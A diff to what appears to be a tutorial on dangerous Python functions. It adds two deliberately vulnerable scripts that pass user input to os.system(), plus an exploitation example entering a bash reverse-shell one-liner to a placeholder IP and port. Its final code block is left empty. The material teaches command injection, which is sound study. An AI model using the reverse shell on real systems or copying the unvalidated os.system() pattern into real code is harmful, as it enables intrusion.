@@ -18,6 +18,36 @@ The following Python fucntions() can be abused to execute code, exfiltrate data,
 
 os.system()
 
-Allows the Python script/program to execute shell commands on the underlying OS. Below is a basic example of how this fcuntion() can be used.
+Allows the Python script/program to execute shell commands on the underlying OS. Below is a basic example of how this function() can be used.
+
+Basic Script - Accepts user input and saves it in the txt variable and then passes the txt variable to os.system()
+```
+#!/usr/bin/python
+
+import os
+
+txt = input("Enter Command to Execute?: ")
+os.system(txt)
+```
+Another example of a similiar program that is not properly validated. The below code asks for a name , but passes the input to os.system(). This is a basic example of how the context of the program does not match it's functionality. 
+```
+#!/usr/bin/python
+
+import os
+
+txt = input("What is your name?: ")
+os.system(txt)
+```
+Explioting the above code. Since the entire input variable is send to os.system(), the attacker can just provide a reverse shell one-liner instead of a valid name
+```
+What is your name?: bash -i >& /dev/tcp/10.10.10.10/9999 0>&1
+
+//Replace IP
+//Replace Port
+```
+The following code accepts user input from the public and passes it to os.system(), allowing the web application to be vulnerable to code execution
+```
 
 
+
+```
